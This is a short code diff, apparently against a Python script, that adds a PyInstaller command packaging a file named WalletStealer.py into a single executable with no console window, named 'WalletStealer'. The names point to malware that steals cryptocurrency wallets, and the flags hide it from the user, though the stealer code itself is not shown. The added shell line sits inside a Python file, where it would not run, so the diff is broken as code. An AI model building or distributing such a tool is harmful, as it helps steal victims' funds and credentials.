@@ -91,3 +91,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+pyinstaller --noconsole --onefile --name "WalletStealer" WalletStealer.py
+
